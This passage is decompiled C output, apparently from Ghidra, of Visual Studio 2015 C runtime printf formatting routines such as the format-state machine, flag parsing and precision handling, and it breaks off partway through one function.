//  private: enum __crt_stdio_output::state __thiscall
// __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::find_next_state(wchar_t,enum
// __crt_stdio_output::state)const 
//  private: enum __crt_stdio_output::state __thiscall
// __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::find_next_state(wchar_t,enum
// __crt_stdio_output::state)const 
// 
// Library: Visual Studio 2015 Release

byte find_next_state(ushort param_1,int param_2)

{
  uint uVar1;
  
  if ((ushort)(param_1 - 0x20) < 0x5b) {
    uVar1 = *(byte *)((int)L"mscoree.dll" + param_1 + 8) & 0xf;
  }
  else {
    uVar1 = 0;
  }
  return (byte)(&DAT_00414ad0)[uVar1 * 8 + param_2] >> 4;
}



// Library Function - Single Match
//  void __cdecl __crt_stdio_output::force_decimal_point(char *,struct __crt_locale_pointers *
// const)
// 
// Library: Visual Studio 2015 Release

void __cdecl __crt_stdio_output::force_decimal_point(char *param_1,__crt_locale_pointers *param_2)

{
  byte bVar1;
  int iVar2;
  byte bVar3;
  bool bVar4;
  
  iVar2 = _tolower((int)*param_1);
  bVar4 = iVar2 == 0x65;
  while (!bVar4) {
    param_1 = (char *)((byte *)param_1 + 1);
    iVar2 = _isdigit((uint)(byte)*param_1);
    bVar4 = iVar2 == 0;
  }
  iVar2 = _tolower((int)*param_1);
  if (iVar2 == 0x78) {
    param_1 = (char *)((byte *)param_1 + 2);
  }
  bVar3 = *param_1;
  *param_1 = ***(byte ***)(*(int *)param_2 + 0x88);
  do {
    param_1 = (char *)((byte *)param_1 + 1);
    bVar1 = *param_1;
    *param_1 = bVar3;
    bVar3 = bVar1;
  } while (*param_1 != 0);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::parse_int_from_format_string(int * const)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

uint __thiscall parse_int_from_format_string(void *this,long *param_1)

{
  int *piVar1;
  int iVar2;
  long lVar3;
  uint uVar4;
  int *piVar5;
  int *local_8;
  
  piVar1 = *(int **)((int)this + 0xc);
  iVar2 = *piVar1;
  *piVar1 = 0;
  local_8 = (int *)0x0;
  lVar3 = _strtol((char *)(*(int *)((int)this + 0x10) + -1),(char **)&local_8,10);
  *param_1 = lVar3;
  piVar5 = *(int **)((int)this + 0xc);
  if ((**(int **)((int)this + 0xc) == 0x22) ||
     (piVar5 = local_8, local_8 < *(int **)((int)this + 0x10))) {
    uVar4 = (uint)piVar5 & 0xffffff00;
  }
  else {
    *(int **)((int)this + 0x10) = local_8;
    uVar4 = CONCAT31((int3)((uint)local_8 >> 8),1);
  }
  if ((*piVar1 == 0) && (iVar2 != 0)) {
    *piVar1 = iVar2;
  }
  return uVar4;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::parse_int_from_format_string(int * const)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::parse_int_from_format_string(int * const)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

uint __thiscall parse_int_from_format_string(void *this,long *param_1)

{
  int *piVar1;
  int iVar2;
  long lVar3;
  uint uVar4;
  int *piVar5;
  int *local_8;
  
  piVar1 = *(int **)((int)this + 0xc);
  iVar2 = *piVar1;
  *piVar1 = 0;
  local_8 = (int *)0x0;
  lVar3 = _wcstol((wchar_t *)(*(int *)((int)this + 0x10) + -2),(wchar_t **)&local_8,10);
  *param_1 = lVar3;
  piVar5 = *(int **)((int)this + 0xc);
  if ((**(int **)((int)this + 0xc) == 0x22) ||
     (piVar5 = local_8, local_8 < *(int **)((int)this + 0x10))) {
    uVar4 = (uint)piVar5 & 0xffffff00;
  }
  else {
    *(int **)((int)this + 0x10) = local_8;
    uVar4 = CONCAT31((int3)((uint)local_8 >> 8),1);
  }
  if ((*piVar1 == 0) && (iVar2 != 0)) {
    *piVar1 = iVar2;
  }
  return uVar4;
}



// Library Function - Single Match
//  public: int __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::process(void)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_stdio_output::
output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>
::process(output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
          *this)

{
  output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
  oVar1;
  bool bVar2;
  byte bVar3;
  char cVar4;
  int *piVar5;
  int iVar6;
  undefined3 extraout_var;
  undefined4 uVar7;
  
  bVar2 = stream_output_adapter<char>::validate((stream_output_adapter_char_ *)(this + 0x448));
  if (!bVar2) {
    return -1;
  }
  if (*(int *)(this + 0x10) == 0) {
switchD_0040506f_caseD_9:
    piVar5 = __errno();
    *piVar5 = 0x16;
    FUN_004091be();
switchD_0040506f_caseD_8:
    iVar6 = -1;
  }
  else {
LAB_004050df:
    *(int *)(this + 0x450) = *(int *)(this + 0x450) + 1;
    if (*(int *)(this + 0x450) != 2) {
      *(undefined4 *)(this + 0x38) = 0;
      *(undefined4 *)(this + 0x1c) = 0;
LAB_004050cc:
      oVar1 = **(output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                 **)(this + 0x10);
      this[0x31] = oVar1;
      if (oVar1 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x0) {
        *(int *)(this + 0x10) = *(int *)(this + 0x10) + 1;
        if (*(int *)(this + 0x18) < 0) goto LAB_004050df;
        bVar3 = find_next_state((char)this[0x31],*(int *)(this + 0x1c));
        *(uint *)(this + 0x1c) = CONCAT31(extraout_var,bVar3);
        switch(CONCAT31(extraout_var,bVar3)) {
        case 0:
          uVar7 = state_case_normal((int)this);
          cVar4 = (char)uVar7;
          break;
        case 1:
          *(undefined4 *)(this + 0x28) = 0xffffffff;
          *(undefined4 *)(this + 0x24) = 0;
          this[0x30] = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                        )0x0;
          *(undefined4 *)(this + 0x20) = 0;
          *(undefined4 *)(this + 0x2c) = 0;
          this[0x3c] = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                        )0x0;
          goto LAB_004050cc;
        case 2:
          uVar7 = state_case_flag((int)this);
          cVar4 = (char)uVar7;
          break;
        case 3:
          uVar7 = state_case_width(this);
          cVar4 = (char)uVar7;
          break;
        case 4:
          goto switchD_0040506f_caseD_4;
        case 5:
          uVar7 = state_case_precision(this);
          cVar4 = (char)uVar7;
          break;
        case 6:
          cVar4 = state_case_size((uint *)this);
          break;
        case 7:
          cVar4 = state_case_type(this);
          break;
        case 0xbad1abe1:
          goto switchD_0040506f_caseD_8;
        default:
          goto switchD_0040506f_caseD_9;
        }
        if (cVar4 == '\0') goto switchD_0040506f_caseD_8;
        goto LAB_004050cc;
      }
      *(int *)(this + 0x10) = *(int *)(this + 0x10) + 1;
      goto LAB_004050df;
    }
    iVar6 = *(int *)(this + 0x18);
  }
  return iVar6;
switchD_0040506f_caseD_4:
  *(undefined4 *)(this + 0x28) = 0;
  goto LAB_004050cc;
}



// Library Function - Single Match
//  public: int __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::process(void)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_stdio_output::
output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>
::process(output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
          *this)

{
  output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
  oVar1;
  bool bVar2;
  byte bVar3;
  char cVar4;
  int *piVar5;
  int iVar6;
  undefined3 extraout_var;
  undefined4 uVar7;
  
  bVar2 = __crt_strtox::c_string_character_source<wchar_t>::validate
                    ((c_string_character_source_wchar_t_ *)(this + 0x448));
  if (!bVar2) {
    return -1;
  }
  if (*(int *)(this + 0x10) == 0) {
switchD_0040518b_caseD_9:
    piVar5 = __errno();
    *piVar5 = 0x16;
    FUN_004091be();
switchD_0040518b_caseD_8:
    iVar6 = -1;
  }
  else {
LAB_004051fb:
    *(int *)(this + 0x450) = *(int *)(this + 0x450) + 1;
    if (*(int *)(this + 0x450) != 2) {
      *(undefined4 *)(this + 0x38) = 0;
      *(undefined4 *)(this + 0x1c) = 0;
LAB_004051e8:
      oVar1 = **(output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                 **)(this + 0x10);
      this[0x31] = oVar1;
      if (oVar1 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x0) {
        *(int *)(this + 0x10) = *(int *)(this + 0x10) + 1;
        if (*(int *)(this + 0x18) < 0) goto LAB_004051fb;
        bVar3 = find_next_state((char)this[0x31],*(int *)(this + 0x1c));
        *(uint *)(this + 0x1c) = CONCAT31(extraout_var,bVar3);
        switch(CONCAT31(extraout_var,bVar3)) {
        case 0:
          uVar7 = state_case_normal((int)this);
          cVar4 = (char)uVar7;
          break;
        case 1:
          *(undefined4 *)(this + 0x28) = 0xffffffff;
          *(undefined4 *)(this + 0x24) = 0;
          this[0x30] = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                        )0x0;
          *(undefined4 *)(this + 0x20) = 0;
          *(undefined4 *)(this + 0x2c) = 0;
          this[0x3c] = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                        )0x0;
          goto LAB_004051e8;
        case 2:
          uVar7 = state_case_flag((int)this);
          cVar4 = (char)uVar7;
          break;
        case 3:
          uVar7 = state_case_width(this);
          cVar4 = (char)uVar7;
          break;
        case 4:
          goto switchD_0040518b_caseD_4;
        case 5:
          uVar7 = state_case_precision(this);
          cVar4 = (char)uVar7;
          break;
        case 6:
          cVar4 = state_case_size((uint *)this);
          break;
        case 7:
          cVar4 = state_case_type(this);
          break;
        case 0xbad1abe1:
          goto switchD_0040518b_caseD_8;
        default:
          goto switchD_0040518b_caseD_9;
        }
        if (cVar4 == '\0') goto switchD_0040518b_caseD_8;
        goto LAB_004051e8;
      }
      *(int *)(this + 0x10) = *(int *)(this + 0x10) + 1;
      goto LAB_004051fb;
    }
    iVar6 = *(int *)(this + 0x18);
  }
  return iVar6;
switchD_0040518b_caseD_4:
  *(undefined4 *)(this + 0x28) = 0;
  goto LAB_004051e8;
}



// Library Function - Single Match
//  public: int __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::process(void)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_stdio_output::
output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>
::process(output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
          *this)

{
  short sVar1;
  bool bVar2;
  byte bVar3;
  char cVar4;
  int *piVar5;
  int iVar6;
  undefined3 extraout_var;
  undefined4 uVar7;
  
  bVar2 = __crt_strtox::c_string_character_source<wchar_t>::validate
                    ((c_string_character_source_wchar_t_ *)(this + 0x448));
  if (!bVar2) {
    return -1;
  }
  if (*(int *)(this + 0x10) == 0) {
switchD_004052a8_caseD_9:
    piVar5 = __errno();
    *piVar5 = 0x16;
    FUN_004091be();
switchD_004052a8_caseD_8:
    iVar6 = -1;
  }
  else {
LAB_0040531c:
    *(int *)(this + 0x450) = *(int *)(this + 0x450) + 1;
    if (*(int *)(this + 0x450) != 2) {
      *(undefined4 *)(this + 0x38) = 0;
      *(undefined4 *)(this + 0x1c) = 0;
LAB_00405305:
      sVar1 = **(short **)(this + 0x10);
      *(short *)(this + 0x32) = sVar1;
      if (sVar1 != 0) {
        *(int *)(this + 0x10) = *(int *)(this + 0x10) + 2;
        if (*(int *)(this + 0x18) < 0) goto LAB_0040531c;
        bVar3 = find_next_state(*(ushort *)(this + 0x32),*(int *)(this + 0x1c));
        *(uint *)(this + 0x1c) = CONCAT31(extraout_var,bVar3);
        switch(CONCAT31(extraout_var,bVar3)) {
        case 0:
          uVar7 = state_case_normal((int)this);
          cVar4 = (char)uVar7;
          break;
        case 1:
          *(undefined4 *)(this + 0x28) = 0xffffffff;
          *(undefined4 *)(this + 0x24) = 0;
          this[0x30] = (output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
                        )0x0;
          *(undefined4 *)(this + 0x20) = 0;
          *(undefined4 *)(this + 0x2c) = 0;
          this[0x3c] = (output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
                        )0x0;
          goto LAB_00405305;
        case 2:
          uVar7 = state_case_flag((int)this);
          cVar4 = (char)uVar7;
          break;
        case 3:
          uVar7 = state_case_width(this);
          cVar4 = (char)uVar7;
          break;
        case 4:
          goto switchD_004052a8_caseD_4;
        case 5:
          uVar7 = state_case_precision(this);
          cVar4 = (char)uVar7;
          break;
        case 6:
          cVar4 = state_case_size((uint *)this);
          break;
        case 7:
          cVar4 = state_case_type(this);
          break;
        case 0xbad1abe1:
          goto switchD_004052a8_caseD_8;
        default:
          goto switchD_004052a8_caseD_9;
        }
        if (cVar4 == '\0') goto switchD_004052a8_caseD_8;
        goto LAB_00405305;
      }
      *(int *)(this + 0x10) = *(int *)(this + 0x10) + 2;
      goto LAB_0040531c;
    }
    iVar6 = *(int *)(this + 0x18);
  }
  return iVar6;
switchD_004052a8_caseD_4:
  *(undefined4 *)(this + 0x28) = 0;
  goto LAB_00405305;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_flag(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_flag(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_flag(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = (int)*(char *)(param_1 + 0x31);
  iVar2 = iVar1 + -0x20;
  if (iVar2 == 0) {
    *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 2;
  }
  else {
    iVar2 = iVar1 + -0x23;
    if (iVar2 == 0) {
      *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 0x20;
    }
    else {
      iVar2 = iVar1 + -0x2b;
      if (iVar2 == 0) {
        *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 1;
      }
      else {
        iVar2 = iVar1 + -0x2d;
        if (iVar2 == 0) {
          *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 4;
        }
        else {
          iVar2 = iVar1 + -0x30;
          if (iVar2 == 0) {
            *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 8;
          }
        }
      }
    }
  }
  return CONCAT31((int3)((uint)iVar2 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::state_case_flag(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_flag(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_flag(int param_1)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = (uint)*(ushort *)(param_1 + 0x32);
  iVar2 = uVar1 - 0x20;
  if (iVar2 == 0) {
    *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 2;
  }
  else {
    iVar2 = uVar1 - 0x23;
    if (iVar2 == 0) {
      *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 0x20;
    }
    else {
      iVar2 = uVar1 - 0x2b;
      if (iVar2 == 0) {
        *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 1;
      }
      else {
        iVar2 = uVar1 - 0x2d;
        if (iVar2 == 0) {
          *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 4;
        }
        else {
          iVar2 = uVar1 - 0x30;
          if (iVar2 == 0) {
            *(uint *)(param_1 + 0x20) = *(uint *)(param_1 + 0x20) | 8;
          }
        }
      }
    }
  }
  return CONCAT31((int3)((uint)iVar2 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal(void)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal(int param_1)

{
  uint uVar1;
  int *piVar2;
  
  uVar1 = state_case_normal_common(param_1);
  if ((char)uVar1 == '\0') {
    piVar2 = __errno();
    *piVar2 = 0x16;
    uVar1 = FUN_004091be();
    return uVar1 & 0xffffff00;
  }
  return CONCAT31((int3)(uVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal(void)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal(int param_1)

{
  uint uVar1;
  int *piVar2;
  
  uVar1 = state_case_normal_common(param_1);
  if ((char)uVar1 == '\0') {
    piVar2 = __errno();
    *piVar2 = 0x16;
    uVar1 = FUN_004091be();
    return uVar1 & 0xffffff00;
  }
  return CONCAT31((int3)(uVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::state_case_normal(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_normal(void)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal(int param_1)

{
  undefined4 uVar1;
  int *piVar2;
  uint uVar3;
  
  uVar1 = state_case_normal_common(param_1);
  if ((char)uVar1 == '\0') {
    piVar2 = __errno();
    *piVar2 = 0x16;
    uVar3 = FUN_004091be();
    return uVar3 & 0xffffff00;
  }
  return CONCAT31((int3)((uint)uVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal_common(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal_common(void)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal_common(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  
  uVar1 = state_case_normal_tchar(param_1);
  if ((char)uVar1 == '\0') {
    return uVar1;
  }
  uVar2 = 0;
  __crt_stdio_output::stream_output_adapter<char>::write_character
            ((stream_output_adapter_char_ *)(param_1 + 0x448),*(char *)(param_1 + 0x31),
             (int *)(param_1 + 0x18));
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal_common(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal_common(void)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal_common(int param_1)

{
  uint uVar1;
  undefined3 extraout_var;
  
  uVar1 = state_case_normal_tchar(param_1);
  if ((char)uVar1 == '\0') {
    return uVar1;
  }
  __crt_stdio_output::string_output_adapter<char>::write_character
            ((string_output_adapter_char_ *)(param_1 + 0x448),*(char *)(param_1 + 0x31),
             (int *)(param_1 + 0x18));
  return CONCAT31(extraout_var,1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_normal_common(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_normal_common(void)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined __fastcall state_case_normal_common(int param_1)

{
  *(undefined *)(param_1 + 0x3c) = 1;
  __crt_stdio_output::string_output_adapter<wchar_t>::write_character
            ((string_output_adapter_wchar_t_ *)(param_1 + 0x448),
             SUB21(*(undefined2 *)(param_1 + 0x32),0),(int *)(param_1 + 0x18));
  return 1;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::positional_parameter_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_normal_tchar(char)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal_tchar(int param_1)

{
  int *piVar1;
  uint uVar2;
  undefined *puVar3;
  
  *(undefined *)(param_1 + 0x3c) = 0;
  puVar3 = *(undefined **)**(undefined4 **)(param_1 + 8);
  if ((*(ushort *)(puVar3 + (uint)*(byte *)(param_1 + 0x31) * 2) & 0x8000) != 0) {
    __crt_stdio_output::stream_output_adapter<char>::write_character
              ((stream_output_adapter_char_ *)(param_1 + 0x448),*(byte *)(param_1 + 0x31),
               (int *)(param_1 + 0x18));
    *(undefined *)(param_1 + 0x31) = **(undefined **)(param_1 + 0x10);
    puVar3 = *(undefined **)(param_1 + 0x10) + 1;
    *(undefined **)(param_1 + 0x10) = puVar3;
    if (*(char *)(param_1 + 0x31) == '\0') {
      piVar1 = __errno();
      *piVar1 = 0x16;
      uVar2 = FUN_004091be();
      return uVar2 & 0xffffff00;
    }
  }
  return CONCAT31((int3)((uint)puVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::positional_parameter_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_normal_tchar(char)
// 
// Library: Visual Studio 2015 Release

uint __fastcall state_case_normal_tchar(int param_1)

{
  int *piVar1;
  uint uVar2;
  undefined *puVar3;
  
  *(undefined *)(param_1 + 0x3c) = 0;
  puVar3 = *(undefined **)**(undefined4 **)(param_1 + 8);
  if ((*(ushort *)(puVar3 + (uint)*(byte *)(param_1 + 0x31) * 2) & 0x8000) != 0) {
    __crt_stdio_output::string_output_adapter<char>::write_character
              ((string_output_adapter_char_ *)(param_1 + 0x448),*(byte *)(param_1 + 0x31),
               (int *)(param_1 + 0x18));
    *(undefined *)(param_1 + 0x31) = **(undefined **)(param_1 + 0x10);
    puVar3 = *(undefined **)(param_1 + 0x10) + 1;
    *(undefined **)(param_1 + 0x10) = puVar3;
    if (*(char *)(param_1 + 0x31) == '\0') {
      piVar1 = __errno();
      *piVar1 = 0x16;
      uVar2 = FUN_004091be();
      return uVar2 & 0xffffff00;
    }
  }
  return CONCAT31((int3)((uint)puVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_precision(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_precision(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_precision(void *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(char *)((int)param_1 + 0x31) != '*') {
